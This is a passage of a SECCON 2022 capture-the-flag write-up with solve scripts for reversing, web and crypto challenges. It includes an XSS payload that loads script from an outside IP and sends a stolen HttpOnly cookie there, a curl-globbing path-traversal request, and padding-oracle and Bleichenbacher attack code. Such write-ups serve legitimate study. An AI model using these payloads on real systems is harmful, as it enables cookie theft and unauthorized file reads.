+  ------------------------------------------------------------------------
+  ```
+
+  - There are some suspicious constants.
+
+  - `seek(7, SEEK_SET)` is called which skips the start of the flag (`SECCON{`).
+
+  - There are `read()` and `F.2` calls.
+
+  - The suspicious constants are for comparisons which ultimately affect the return value.
+
+  - `F.2` isn’t too long and after some manual simplficiations it boils down to:
+
+    ``` py
+    def f2(arg: i32) -> i32:
+    ret = 0x0acab3c0
+
+    for i in range(4):
+        x = ((arg >> (i << 0x3)) & 0xff) ^ ret
+        new = x << 0x8
+        old = ret >> 0x18
+        ret = new | old
+
+    return ret
+    ```
+
+  Or in other words: it implements a XOR of the argument with the constant `0x0acab3c0`.
+
+Just trying out to XOR the constants with `0x0acab3c0` didn’t result in ASCII so there must be something else happening in `F.1`. Instead of going through the IR manually we’re using a dynamic approach here. Since we have a custom ClamAV build and don’t use a JIT, when we’re running our custom `clamscan` it uses a VM interpreter which we can modify in `libclamav/bytecode_vm.c`. The patch we’re applying is
+
+``` diff
+-            DEFINE_ICMPOP(OP_BC_ICMP_EQ, res = (op0 == op1));
++            DEFINE_ICMPOP(OP_BC_ICMP_EQ, printf("%d: %x =?= %x\n", bb_inst, op0, op1);res = (op0 == op1));
+```
+
+which allows us to see comparisons.
+
+After creating a `flag.txt` with `SECCON{test_value}` we can see that our magic constants don’t appear in the execution trace of `clamscan`. Only after we’ve increased the length of `test_value` to 36 we finally see a comparison with `0x739e80a2`. Then setting the test value to null bytes we actually see the following output:
+
+    1: acab3c0 =?= 739e80a2
+    7: acab3c0 =?= 3aae80a3
+    14: acab3c0 =?= 3ba4e79f
+    21: acab3c0 =?= 78bac1f3
+    28: acab3c0 =?= 5ef9c1f3
+    35: acab3c0 =?= 3bb9ec9f
+    42: acab3c0 =?= 558683f4
+    49: acab3c0 =?= 55fad594
+    56: acab3c0 =?= 6cbfdd9f
+
+So the XOR does indeed happen as expected. Then we modify some bytes/nibbles of the input and observe how the output changes. What we observe is that some bytes are shuffled before the XOR according to the following pattern:
+
+    input:  0xaabbccdd
+    output: 0xaaddccbb
+
+After verifying that this works for the first four bytes we can write our final solve script:
+
+``` python
+#!/usr/bin/env python3
+
+import struct
+
+def f2(arg):
+    ret = 0x0acab3c0
+
+    for i in range(4):
+      x = ((arg >> (i << 0x3)) & 0xff) ^ ret
+      new = x << 0x8
+      old = ret >> 0x18
+      ret = (new | old) & 0xffffffff
+
+    return ret
+
+# Also serves as unshuffle()
+def shuffle(i):
+    b = struct.pack("<I", i)
+    b = bytes([b[0], b[3], b[2], b[1]])
+    return struct.unpack("<I", b)[0]
+
+constants = [0x739e80a2, 0x3aae80a3, 0x3ba4e79f, 0x78bac1f3, 0x5ef9c1f3, 0x3bb9ec9f, 0x558683f4, 0x55fad594, 0x6cbfdd9f]
+flag = bytes()
+for c in constants:
+    flag += struct.pack("<I", shuffle(f2(shuffle(c))))
+print((b"SECCON{" + flag + b"}").decode())
+```
+
+    SECCON{byT3c0d3_1nT3rpr3T3r_1s_4_L0T_0f_fun}
+
+### easylfi
+
+##### sandr0 \| web, 62 solves, 124 points
+
+`curl` has built in globbing:
+
+- `{.}.` bypasses path traversal filter for `..`
+- `{proc/self/cmdline,flag.txt}` it causes `curl` to open both files and append the output of them after another divided by a newline `\n`
+- Resulting in (local debug-output) `--_curl_--file:///app/public/../../proc/self/cmdline\ncurl\x00file:///app/public/{.}./{.}./{proc/self/cmdline,flag.txt}\x00--_curl_--file:///app/public/../../flag.txt\nSECCON{dummydummy}\n`
+- Now we need to transform the output so it passes the `waf`. The transformations can only transform `\{(.*\})?` (regex notation)
+  - we replace `{.}` with `lol` to get the unwanted curlies out of the way (I think, this is not necessary but this is how I did it) =\> `--_curl_--file:///app/public/../../proc/self/cmdline\ncurl\x00file:///app/public/lol./lol./{proc/self/cmdline,flag.txt}\x00--_curl_--file:///app/public/../../flag.txt\nSECCON{dummydummy}\n`
+  - we replace `{proc/self/cmdline,flag.txt}` with `{` to get a single open bracket into the string =\> `--_curl_--file:///app/public/../../proc/self/cmdline\ncurl\x00file:///app/public/lol./lol./{\x00--_curl_--file:///app/public/../../flag.txt\nSECCON{dummydummy}\n`
+  - we replace `{` with `}{` to get a closing bracket after `SECCON` =\> `--_curl_--file:///app/public/../../proc/self/cmdline\ncurl\x00file:///app/public/lol./lol./}{\x00--_curl_--file:///app/public/../../flag.txt\nSECCON}{dummydummy}\n`
+  - we finally replace `{%00--_curl_--file:///app/public/../../flag.txt%0aSECCON}` with`hxp` to get `SECCON` out of the string to pass the `waf` =\> `--_curl_--file:///app/public/../../proc/self/cmdline\ncurl\x00file:///app/public/lol./lol./}hxp{dummydummy}\n`
+
+Put together:
+
+``` py
+send(b"GET /{.}./{.}./{proc/self/cmdline,flag.txt}?{.}=lol&{proc/self/cmdline,flag.txt}={&{=}{&{%00--_curl_--file:///app/public/../../flag.txt%0aSECCON}=hxp HTTP/1.1\r\nHost: .\r\n\r\n")
+```
+
+Gives me the flag
+
+    --_curl_--file:///app/public/../../proc/self/cmdline
+    curl\x00ile:///app/public/lol./lol./}hxp{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
+
+    SECCON{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
+
+### bffcalc
+
+##### yyyyyyy \| web, 41 solves, 149 points
+
+Obvious XSS; the goal is to steal a `HttpOnly` cookie. In the `bff` part there’s a handmade HTTP proxy forwarding our calculation requests to the `backend`, which conveniently echoes back the calculator input if it contains “unsafe” characters. So, we inject `\r\n` to split the forwarded HTTP request and make most of the original request part of the submitted calculator input. Playing around showed that the server would cut off the form data at `;` characters, so some playing around was required to inject `;expr=` sequences in various parts of the original request.
+
+Resulting XSS injection:
+
+``` html
+<img src/onerror="var el=document.createElement('script'); el.setAttribute('src','//42.42.42.42:8888/pay.js'); this.parentNode.appendChild(el);">
+```
+
+JavaScript payload (`pay.js`):
+
+``` javascript
+fetch('api%20HTTP/1.1%0d%0aHost:%20x%0d%0a%0d%0aPOST%20api%20HTTP/1.1%0d%0aHost:%20x%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20477%0d%0a%0d%0aexpr%3d', {headers: {'Accept-Language':'love','X-Foo':';expr='}}).then(r=>r.text()).then(r=>fetch('//42.42.42.42:5555/aa?'+btoa(r))).then(r=>r.text()).then(console.log);
+```
+
+Resulting request coming in:
+
+    GET /aa?NDJIVFRQLzEuMSAyMDAgT0sNCkNvbnRlbnQtTGVuZ3RoOiA0MDkNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCkRhdGU6IFNhdCwgMTIgTm92IDIwMjIgMTY6NTI6NTggR01UDQpTZXJ2ZXI6IENoZXJyeVB5LzE4LjguMA0KVmlhOiB3YWl0cmVzcw0KDQpbJyBIVFRQLzEuMVxyXG5SZW1vdGUtQWRkcjogMTcyLjE4LjAuNlxyXG5SZW1vdGUtSG9zdDogMTcyLjE4LjAuNlxyXG5Db25uZWN0aW9uOiB1cGdyYWRlXHJcbkhvc3Q6IG5naW54XHJcblgtUmVhbC1JcDogMTcyLjE4LjAuMlxyXG5YLUZvcndhcmRlZC1Gb3I6IDE3Mi4xOC4wLjJcclxuWC1Gb3J3YXJkZWQtUHJvdG86IGh0dHBcclxuQWNjZXB0LUxhbmd1YWdlOiBsb3ZlXHJcblVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTEnLCAnXHJcbkFjY2VwdDogKi8qXHJcblJlZmVyZXI6IGh0dHA6Ly9uZ2lueDozMDAwL1xyXG5BY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGVcclxuQ29va2llOiBmbGFnPVNFQ0NPTntpNV8xdF9wMHNzaWJsZV90T19zN2VhbF9odHRwX29ubHlfY29va2kzX2ZyMG1fWFNTfVxyXG5ccidd HTTP/1.1
+    Host: 42.42.42.42:5555
+    Connection: keep-alive
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+    Accept: */*
+    Origin: http://nginx:3000
+    Referer: http://nginx:3000/
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+
+Base64-decode the `GET` parameter and that’s it:
+
+    42HTTP/1.1 200 OK
+    Content-Length: 409
+    Content-Type: text/html;charset=utf-8
+    Date: Sat, 12 Nov 2022 16:52:58 GMT
+    Server: CherryPy/18.8.0
+    Via: waitress
+
+    [' HTTP/1.1\r\nRemote-Addr: 172.18.0.6\r\nRemote-Host: 172.18.0.6\r\nConnection: upgrade\r\nHost: nginx\r\nX-Real-Ip: 172.18.0.2\r\nX-Forwarded-For: 172.18.0.2\r\nX-Forwarded-Proto: http\r\nAccept-Language: love\r\nUser-Agent: Mozilla/5.0 (X11', '\r\nAccept: */*\r\nReferer: http://nginx:3000/\r\nAccept-Encoding: gzip, deflate\r\nCookie: flag=SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}\r\n\r']
+
+### janken vs kurenaif
+
+##### yyyyyyy \| crypto, 17 solves, 221 points
+
+Goal: Find a seed for Python’s `random` object (a Mersenne twister) such that the RNG wins a sequence of 666 rock-paper-scissors games against a predetermined sequence of choices (made by the “witch”).
+
+I basically z3’d every part of this: First, recovering the required state *after seeding* using a slightly modified version of `crackmt.py` from [here](https://github.com/icemonster/symbolic_mersenne_cracker). Then, undoing the `init_by_array` transformation applied by Python to derive the internal state from the seed. Everything here is easily invertible, so this is an exercise in coding for z3.
+
+Solve script:
+
+``` python
+import random, z3, crackmt
+
+def untwist(state, count=1):
+    vs = [z3.BitVec(f'v{i}',32) for i in range(624)]
+    ws = vs
+    for _ in range(count):
+        ws = crackmt.Untwister.symbolic_twist(None, ws)
+    solver = z3.Solver()
+    for w,t in zip(ws, state[1][:624]):
+        solver.add(w == t)
+    assert solver.check() == z3.sat
+    m = solver.model()
+    sol = tuple(m[v].as_long() for v in vs)
+    return (state[0], sol + (624,), None)
+
+def janken(a, b):
+    return (a - b + 3) % 3
+
+def solve(witch_seq):
+    from crackmt import Untwister
+    untw = Untwister()
+
+    # compatible with output of init_by_array() seeding algorithm
+    untw.solver.add(untw.MT[0] == (1 << 31))
+    untw.index = 624
+
+    ts = ''
+    for i,w in enumerate(witch_seq):
+        a, = (a for a in range(3) if janken(a,w) == 1)
+        untw.submit(f'{a:02b}' + '?'*30)
+        ts += str(a)
+
+    obj = untw.get_random()
+    print(obj.getstate())
+
+    orig_state = untwist(obj.getstate(), 2)
+    print(orig_state)
+
+    obj2 = random.Random()
+    obj2.setstate(orig_state)
+    assert ''.join(str(obj2.randint(0,2)) for _ in range(666)) == ts
+
+    return orig_state
+
+################################################################
+
+shr = lambda x,i: (x >> i) if isinstance(x,int) else z3.LShR(x,i)
+
+def init_genrand(seed):
+    mt = [seed]
+    mti = 1
+    while mti < 624:
+        mt.append(1812433253 * (mt[-1] ^ shr(mt[-1], 30)) + mti)
+        mt[-1] &= 0xffffffff
+        mti += 1
+    return mt
+
+# couldn't be bothered to clean up the C-style code lol
+def init_by_array(init_key):
+    N = 624
+    key_length = len(init_key)
+    mt = init_genrand(19650218)
+    i = 1
+    j = 0
+    k = (N if N > key_length else key_length)
+    while k:
+        mt[i] = (mt[i] ^ ((mt[i-1] ^ shr(mt[i-1], 30)) * 1664525)) + init_key[j] + j;
+        mt[i] &= 0xffffffff
+        i+=1; j+=1;
+        if (i>=N):
+            mt[0] = mt[N-1];
+            i=1;
+        if (j>=key_length):
+            j=0;
+        k -= 1
+    k = N-1
+    while (k):
+        mt[i] = (mt[i] ^ ((mt[i-1] ^ shr(mt[i-1], 30)) * 1566083941)) - i;
+        mt[i] &= 0xffffffff
+        i+=1;
+        if (i>=N):
+            mt[0] = mt[N-1];
+            i=1;
+        k -= 1
+    mt[0] = 0x80000000
+    return mt
+
+def un_init_by_array(state):
+    assert state[1][0] == 1 << 31
+    assert state[1][-1] == 624
+    arr = list(state[1][:624])
+
+    vs = [z3.BitVec(f'v{i}',32) for i in range(624)]
+    solver = z3.Solver()
+    for v,t in zip(init_by_array(vs), arr):
+        solver.add(v == t)
+    assert solver.check() == z3.sat
+    m = solver.model()
+    nums = [m[v].as_long() for v in vs]
+    seed = sum(num << 32*i for i,num in enumerate(nums))
+    assert state == random.Random(seed).getstate()
+    return seed
+
+# ...
+
+s = until('What about your spell?\n').decode()
+witch_seed = int(re.search('My spell is ([0-9a-f]+)', s).groups()[0], 16)
+witch_rng = random.Random(witch_seed)
+witch_seq = [witch_rng.randint(0,2) for _ in range(666)]
+
+state = solve(witch_seq)
+print(f'\x1b[33m{state = }\x1b[0m')
+seed = un_init_by_array(state)
+print(f'\x1b[32m{seed = :#x}\x1b[0m')
+
+sock.sendall(f'{seed:x}\n'.encode())
+
+# ...
+```
+
+Flag: SECCON{<https://youtu.be/h0GSFxoRhrc>}
+
+### pqpq
+
+##### yyyyyyy \| 112 solves, 96 points
+
+RSA with three prime factors \$p,q,r\$. We’re given the public key and additionally the values \$c_1 = (p^e-q^e) \bmod n\$ and \$c_2 = (p-q)^e \bmod n\$. Applying the binomial theorem shows that \$c_2 = (p^e + p\cdot q\cdot \mathit{stuff} + q^e) \bmod n\$, so \$c_2-c_1 = p\cdot q\cdot \mathit{stuff} + 2\cdot q^e\$ which is divisible by \$q\$, and similarly \$c_1+c_2\$ is divisible by \$p\$. Thus, \$\gcd(c_1\pm c_2,n)\$ recovers two distinct prime divisors of \$n\$ and obviously we have \$r=n/(p\cdot q)\$.
+
+Decryption was non-unique as \$e\$ was even, so there were two possible decryptions modulo each prime factor. Simply CRT all 8 combinations of square roots to find the flag.
+
+Solve script:
+
+```
+proof.all(False)
+
+p = gcd(c1 - c2, n)
+q = gcd(c1 + c2, n)
+print(p)
+print(q)
+r = n // p // q
+print(r)
+
+d1 = ZZ(~Mod(e//2, (p-1)*(q-1)*(r-1)))
+m1 = ZZ(pow(cm, d1, n))
+
+for mp in Mod(m1,p).sqrt(all=True):
+    for mq in Mod(m1,q).sqrt(all=True):
+        for mr in Mod(m1,r).sqrt(all=True):
+            m = ZZ(mp.crt(mq).crt(mr))
+            print(int(m).to_bytes(1024,'big'))
+```
+
+Flag: SECCON{being_able_to_s0lve_this_1s_great!}
+
+### witches_symmetric_exam
+
+##### yyyyyyy \| crypto, 22 solves, 197 points
+
+We’re looking at a decryption oracle for a symmetric cipher mode that uses the same AES key for GCM wrapped inside OFB. The oracle checks whether the OFB padding is correct, and if so, checks whether the GCM ciphertext is valid too. The goal is to forge a valid encryption of a given target message, and also to decrypt the given ciphertext.
+
+The main thing to notice here is that the OFB padding oracle allows us to construct an encryption oracle for the underlying block cipher (i.e., AES). With that, all that remains to be noticed is that both OFB and GCM rely only on the block cipher’s *en*cryption, so we can simply reimplement the encryption and decryption algorithms for OFB and GCM using our AES encryption oracle as a black box instead of a normal AES implementation.
+
+Script:
+
+``` python
+ciphertext = bytes.fromhex(until('\n').decode().strip().split()[-1])
+print('ciphertext:', ' '.join(ciphertext[i:i+16].hex() for i in range(0,len(ciphertext),16)))
+
+def oracle(bs):
+    until('ciphertext: ')
+    sock.sendall(f'{bs.hex()}\n'.encode())
+    s = until('\n').strip().decode()
+    if s == repr(b'ofb error'):
+        return 1
+    if s == repr(b'gcm error'):
+        return 2
+    print(f'\x1b[39m{s}\x1b[0m')
+    raise NotImplementedError
+
+################################################################
+
+import sys
+
+def xor(*xss):
+    assert xss
+    if len(xss) == 1:
+        return bytes(xss[0])
+    return xor((x^y for x,y in zip(*xss[:2])), *xss[2:])
+
+def encblk(blk):
+    sol = [0]*16
+    for i in reversed(range(16)):
+        cnt = 16-i%16
+        pad = [0]*(16-cnt) + [cnt]*cnt
+        for j in range(0x100):
+            sol[i] = j
+            chk = xor(sol, pad)
+            r = oracle(blk + chk)
+            print(f'{i:3} {bytes(sol).hex()}', r, end='\r', file=sys.stderr)
+            if r == 2:
+                print(f'{i:3} {bytes(sol).hex()}', r)
+                break
+        else: assert False
+    return bytes(sol)
+
+def encblk(blk):    # faster
+    sol = [0]*16
+    for i in reversed(range(16)):
+        cnt = 16-i%16
+        pad = [0]*(16-cnt) + [cnt]*cnt
+        chks = [(j, xor(sol[:i] + [j] + sol[i+1:], pad)) for j in range(0x100)]
+        for _,chk in chks:
+            sock.sendall((blk + chk).hex().encode() + b'\n')
+        found = 0
+        for j,chk in chks:
+            r = until('\n').decode().strip().replace('ciphertext: b', '').replace("'", '')
+            if r == 'gcm error':
+                sol[i] = j
+                found += 1
+        assert found == 1
+        print(f'{i:3} {bytes(sol).hex()}')
+    return bytes(sol)
+
+################################################################
+
+H = encblk(b'\0' * 16)
+print('H =', H.hex())
+
+
+ofb_stream = ciphertext[:16]
+while len(ofb_stream) < len(ciphertext):
+    ofb_stream += encblk(ofb_stream[-16:])
+    ofb_input = xor(ciphertext, ofb_stream)[16:]
+
+print('OFB input:', ofb_input.hex())
+
+from Crypto.Util.Padding import unpad
+gcm_tag = ofb_input[:16]
+gcm_nonce = ofb_input[16:][:16]
+gcm_ciphertext = unpad(ofb_input[16:][16:], 16)
+
+print(f'tag: {gcm_tag.hex()}')
+print(f'nonce: {gcm_nonce.hex()}')
+print(f'ciphertext: {gcm_ciphertext.hex()}')
+
+
+from Crypto.Util.number import long_to_bytes
+fill = (16 - (len(gcm_nonce) % 16)) % 16 + 8
+ghash_in = (gcm_nonce + b'\x00' * fill + long_to_bytes(8 * len(gcm_nonce), 8))
+from Crypto.Cipher._mode_gcm import _GHASH
+from Crypto.Cipher._mode_gcm import _ghash_portable as ghash_c
+j0 = _GHASH(H, ghash_c).update(ghash_in).digest()
+ctr0 = int.from_bytes(j0, 'big')
+print(f'{ctr0 = :#x}')
+
+toblk = long_to_bytes
+
+gcm_stream = b''
+for i in range((len(gcm_ciphertext)+15)//16):
+    gcm_stream += encblk(toblk(ctr0 + 1 + i))
+    gcm_input = xor(gcm_ciphertext, gcm_stream)
+
+print('plaintext:', gcm_input)
+
+
+msg = b'give me key'
+evil_nonce = gcm_nonce
+evil_cipher = xor(gcm_ciphertext, msg, gcm_input)
+evil_tag = xor(
+        _GHASH(H, ghash_c) \
+            .update(evil_cipher + b'\0'*(-len(evil_cipher)%16)
+                  + long_to_bytes(0,8)
+                  + long_to_bytes(8*len(evil_cipher),8))
+            .digest(),
+        encblk(toblk(ctr0))
+    )
+
+from Crypto.Util.Padding import pad
+evil = ciphertext[:16] + xor(ofb_stream[16:], pad(evil_tag + evil_nonce + evil_cipher, 16))
+until('ciphertext: ')
+sock.sendall(f'{evil.hex()}\n'.encode())
+until('say secret spell:')
+sock.sendall(f'{gcm_input.decode()}\n'.encode())
+
+while True:
+    s = sock.recv(0x100)
+    if not s:
+        break
+    s = s.decode().strip()
+    print(f'--> \x1b[32m{s}\x1b[0m')
+```
+
+Flag: SECCON{you_solved_this!?I_g1ve_y0u_symmetr1c_cipher_mage_certificate}
+
+### this_is_not_lsb
+
+##### yyyyyyy \| crypto, 34 solves, 162 points
+
+We’re given an oracle that checks whether all 8 most significant bits of an RSA-decrypted message are set. This is a standard Bleichenbacher-style situation.
+
+Finding an initial range is particularly easy using the knowledge that the plaintext is relatively short; can apply binary search for the minimal and maximal \$k\$ such that \$k\cdot \mathit{flag} \< N\$ and has valid padding. Then standard Bleichenbacher.
+
+Disgusting solve script:
+
+``` python
+def oracle(v):
+    until('c = ')
+    sock.sendall(f'{v}\n'.encode())
+    r = until('\n').decode().strip()
+    return ('False', 'True').index(r)
+
+################################################################
+
+padlo = (0xff << (n.bit_length() - 2 - 8))
+padhi = (0x100 << (n.bit_length() - 2 - 8))
+print(f'{padlo = :#x}')
+print(f'{padhi-1 = :#x}')
+
+lo = 2**(flag_length-1)
+hi = 2**(flag_length+0)
+assert lo.bit_length() == flag_length
+assert (hi-1).bit_length() == flag_length
+
+################################################################
+
+print(f'{log(hi-lo,2) = }')
+print(f'{lo = :#x}')
+print(f'{hi = :#x}')
+
+mm = 0x200
+for i in range(mm):
+    t = lo + (hi - lo) * i // mm
+    s = (padlo + padhi) // 2 // t
+    res = oracle(pow(s,e,n)*c)
+    print(hex(s), res)
+
+    if res:
+        lo = (padlo + s-1) // s     -5#XXX
+        hi = padhi // s             +5#XXX
+        break
+else:
+    assert False
+
+################################################################
+
+# wurgh, ugliest Bleichenbacher code I've ever written
+
+intervals = [(lo,hi)]; del lo, hi
+
+while len(intervals) > 1 or intervals[0][1] - intervals[0][0] > 9:
+
+    if len(intervals) != 1:
+        raise NotImplementedError
+
+    lo,hi = intervals[0]    #XXX
+
+    print(f'{log(hi-lo,2) = }')
+    print(f'{lo = :#x}')
+    print(f'{hi = :#x}')
+
+    r = ((2 * (hi-1)*s - padlo) +(n-1))//n
+    while True:
+        for _ in range(777):
+            s = random.randrange(((padlo + r*n) +hi)//(hi+1), (padhi + r*n) // lo+1)
+            if oracle(pow(s,e,n)*c):
+                break
+        else:
+            r += 1
+            continue
+        break
+    assert oracle(pow(s,e,n)*c)
+
+    ints = []
+    for r in range(((lo*s-padhi+1)+n-1)//n, (hi*s-padlo)//n+1):
+        ints += [(max(lo, ((padlo+r*n)+(s-1))//s), min(hi, (padhi-1+r*n)//s)) for lo,hi in intervals]
+    intervals = ints
+```
+
+Flag: SECCON{WeLC0me_t0_tHe_MirRoR_LaNd!\_tHIs_is_lSb_orAcLe!}
+
+### BBB
+
+##### yyyyyyy \| crypto, 50 solves, 136 points
+
+We’re given five RSA encryptions of the flag ciphertext for different public keys, where the \$n\$ is random each time and \$e\$ comes out of an RNG that we’re able to “backdoor”. In a nutshell the RNG consists of iterating the map \$f\colon x \mapsto (x^2 + ax + b) \bmod p\$ where \$p\$ is a random prime and \$a\$ an integer randomly chosen each time; we’re allowed to choose \$b\$ after learning \$a\$ and \$p\$. Moreover, on each iteration, we can choose the initial input to \$f\$, but we don’t know how many times it will be applied.
+
+The script makes sure that \$e\$ is no smaller than \$11\$ and pads the flag plaintext with \$16\$ random bytes.
+
+First, we observe that the random padding happens outside the loop, so it’s actually the same for each encryption. Moreover, the plaintext is known to be short (116 bytes including the padding). This means if we manage to force the same, small \$e\$ for all five encryptions, we can apply Håstad’s broadcast attack to recover the flag.
+
+The way we solved this is to basically find a \$b\$ such that \$e=11\$ is a fixed point of \$f\$, and to additionally hope that there are enough distinct inputs \$y\$ which lead to \$e=11\$ within very few applications of \$f\$.
+
+Choosing \$b\$ such that \$e\$ is a fixed point of \$f\$ amounts to finding \$b\$ such that \$f(e)-e = 0\$; this is a linear equation. We then simply tried whether other inputs leading to \$e\$ could be found, by solving a few quadratic equations of the form \$f(y_1)=e\$, \$f(y_2)=y_1\$, and so on. The chances of this happening were not too bad.
+
+Sage script:
+
+```
+s = until('door!!').decode()
+a = ZZ(int(re.search('a=([0-9]+)',s).groups()[0]))
+p = ZZ(int(re.search('p=([0-9]+)',s).groups()[0]))
+
+r = solve(p, a)
+if r is None:
+    exit(f'\x1b[31mnope...\x1b[0m')
+b, ys = r; del r
+
+print(f'\x1b[36m{b = }\x1b[0m')
+sock.sendall(f'{b}\n'.encode())
+
+for y in ys:
+    print(f'\x1b[34m{y = }\x1b[0m')
+    until('input seed:')
+    sock.sendall(f'{y}\n'.encode())
+
+cc = Mod(0,1)
+for i in range(len(ys)):
+    s = (until('[+] Cipher Text:') + until('\n')).decode()
+    n = ZZ(int(re.search('n=([0-9]+)',s).groups()[0]))
+    e = ZZ(int(re.search('e=([0-9]+)',s).groups()[0]))
+    assert e == 11
+    c = ZZ(int(re.search('Cipher Text: ([0-9]+)',s).groups()[0]))
+    cc = cc.crt(Mod(c,n))
+
+cc = ZZ(cc)
+m = cc^(1/11)
+m = ZZ(m)
+
+print(f'--> \x1b[32m{m:#x}\x1b[0m')
+```
+
+Flag: SECCON{Can_you_find_d_in_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbdbbbbbbbbbbbbbbbbbbbbbbbbbbbbb?}
+
+### insufficient
+
+##### yyyyyyy \| crypto, 33 solves, 164 points
+
+This was a Shamir-inspired secret sharing scheme, however using multivariate (rather than univariate) polynomials with small coefficients (rather than uniform). Moreover, one part of the inputs (\$z\$) was not in the shares, making the resulting equation we have to solve non-linear.
+
+In short, we’re given tuples \$((x_i,y_i),w_i)\$ where \$w_i = f(x_i,y_i,z_i)\$ but the input \$z_i\$ as well as the coefficients \$a_1,a_2,a_3,b_1,b_2,b_3,c,s\$ of \$f(x,y,z) = a_1\cdot x + a_2\cdot x^2 + a_3\cdot x^3 + b_1\cdot y + b_2\cdot y^2 + b_3\cdot y^3 + c\cdot z + s\$ are secret.
+
+Step 1 is to turn the problem around: We’re dealing with linear equations \$f_i(a_1,a_2,a_3,b_1,b_2,b_3,s,c\cdot z) = 0\$, and we’re given size constraints on each input. This is a classical lattice setting.
+
+Step 1: Work with the polynomials \$g_i = f_i - f\_{i+1}\$ instead to eliminate the variable \$s\$. (This may not have been necessary; not sure…)
+
+Step 2: LLL it in the “usual” way to find \$a_1,a_2,a_3,b_1,b_2,b_3\$, and a list of the values \$c\cdot (z_i-z\_{i+1})\$. The coefficient \$c\$ can be recovered as the \$\gcd\$ of those values, possibly with a few small extra factors by chance.
+
+Step 3: Define the polynomials \$h_i\$ as the \$f_i\$ with the now-found \$a_1,a_2,a_3,b_1,b_2,b_3,c\$ values filled in. We still have to find \$s\$; this is another linear system with size constraints because we still don’t know the \$z_i\$s. LLL that too.
+
+Code:
+
+```
+#!/usr/bin/env sage
+proof.all(False)
+
+print()
+
+assert len(shares) == 4
+R.<a1,a2,a3,b1,b2,b3,c,s, z1,z2,z3,z4> = PolynomialRing(GF(p), order='invlex')
+zs = R.gens()[-4:]
+
+fs = []
+for ((x,y),w),z in zip(shares, zs):
+    f = -w
+    f += a1*x + a2*x^2 + a3*x^3
+    f += b1*y + b2*y^2 + b3*y^3
+    f += c*z
+    f += s
+    fs.append(f)
+
+for f in fs:
+    print(f)
+print()
+
+#XXX
+S.<a1,a2,a3,b1,b2,b3> = PolynomialRing(GF(p), order='invlex')
+gs = []
+for i in range(len(fs)-1):
+    g = S(str((fs[i]-c*zs[i]) - (fs[i+1]-c*zs[i+1])))
+    gs.append(g)
+
+for g in gs:
+    print(g)
+print()
+
+mons = sorted({v for g in gs for _,v in g} - {1})
+print(f'\x1b[35m{mons}\x1b[0m')
+print()
+
+offvec = [randrange(2^128) for _ in mons]  #XXX HACK
+
+M = block_matrix(ZZ, [
+        [
+            matrix([[-g.monomial_coefficient(g.parent().one()) for g in gs]]),
+            matrix([offvec]),
+            matrix([[-1]]),
+        ],
+        [
+            matrix([
+                    [g.monomial_coefficient(v) for g in gs]
+                    for v in mons
+                ]),
+            identity_matrix(len(mons)),
+            matrix(len(mons), 1),
+        ], [
+            p * identity_matrix(len(gs)),
+            matrix(len(gs), len(mons)),
+            matrix(len(gs), 1),
+        ],
+    ])
+#print(M)
+#print(M.change_ring(Zmod(10^9)))
+
+
+ws = [256,256,256, 128,128,128, 128,128,128, -5]
+W = diagonal_matrix(2^(max(ws)-w) for w in ws)
+print(W)
+
+L = M.parent()((M * W).BKZ(fp='rr', precision=100) * ~W)
+for row in L:
+    print(row)
+    if row[-1] == -1:
+        row = -row
+    if row[-1] == 1:
+        break
+else:
+    raise NotImplementedError('lazy')
+
+
+
+import itertools
+
+row0 = row
+for os in itertools.product([L.rows()[0].parent()(0)] + list(L.rows()), repeat=2):
+  for ss in itertools.product((+1,-1), repeat=len(os)-1):
+    o = os[0] + sum(sgn*o for sgn,o in zip(ss,os[1:]))
+    if o[-1]:
+        continue
+    row = row0 + o
+
+    cz12, cz23, cz34, a1off,a2off,a3off, b1off,b2off,b3off, one = row
+    assert one == 1
+    a1 = a1off + offvec[0]
+    a2 = a2off + offvec[1]
+    a3 = a3off + offvec[2]
+    b1 = b1off + offvec[3]
+    b2 = b2off + offvec[4]
+    b3 = b3off + offvec[5]
+    print(f'\x1b[36m{a1 = }\x1b[0m')
+    print(f'\x1b[36m{a2 = }\x1b[0m')
+    print(f'\x1b[36m{a3 = }\x1b[0m')
+    print(f'\x1b[36m{b1 = }\x1b[0m')
+    print(f'\x1b[36m{b2 = }\x1b[0m')
+    print(f'\x1b[36m{b3 = }\x1b[0m')
+
+    c = gcd([cz12, cz23, cz34])
+    print(f'\x1b[36m{c = }\x1b[0m')
+    if c <= 666:    # almost certainly wrong if small
+        continue
+    print()
+
+    print(f'\x1b[32m{a1 = }\x1b[0m')
+    print(f'\x1b[32m{a2 = }\x1b[0m')
+    print(f'\x1b[32m{a3 = }\x1b[0m')
+    print(f'\x1b[32m{b1 = }\x1b[0m')
+    print(f'\x1b[32m{b2 = }\x1b[0m')
+    print(f'\x1b[32m{b3 = }\x1b[0m')
+    print(f'\x1b[32m{c = }\x1b[0m')
+
+    ################################################################
+
+    hs = [f(a1,a2,a3, b1,b2,b3, c, s, z1,z2,z3,z4) for f in fs]
+    for h in hs:
+        print(h)
+    print()
+
+    mons = sorted({v for h in hs for _,v in h} - {1})
+    print(f'\x1b[35m{mons}\x1b[0m')
+    print()
+
+    M = block_matrix(ZZ, [
+            [
+                matrix([[-h.monomial_coefficient(h.parent().one()) for h in hs]]),
+                matrix([[2^127]*len(mons)]),
+                matrix([[-1]]),
+            ],
+            [
+                matrix([
+                        [h.monomial_coefficient(v) for h in hs]
+                        for v in mons
+                    ]),
+                identity_matrix(len(mons)),
+                matrix(len(mons), 1),
+            ], [
+                p * identity_matrix(len(hs)),
+                matrix(len(hs), len(mons)),
+                matrix(len(hs), 1),
+            ],
+        ])
+    print(M.change_ring(Zmod(10000)))
+
+    ws = [-5, -5, -5, -5, 128, 128, 128, 128, 128, -5]
+    W = diagonal_matrix(2^(max(ws)-w) for w in ws)
